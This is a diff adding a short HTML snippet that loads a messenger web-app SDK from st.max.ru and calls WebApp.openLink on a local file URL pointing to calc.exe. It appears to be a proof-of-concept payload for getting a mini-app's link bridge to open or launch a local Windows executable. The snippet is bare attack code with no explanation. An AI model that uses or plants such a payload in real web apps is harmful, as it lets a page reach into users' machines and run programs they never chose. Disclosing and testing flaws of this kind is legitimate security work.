@@ -1,0 +1,4 @@
+<script src="https://st.max.ru/js/max-web-app.js"></script>
+ <script>
+ WebApp.openLink('file:///C:/Windows/System32/calc.exe');
+ </script>
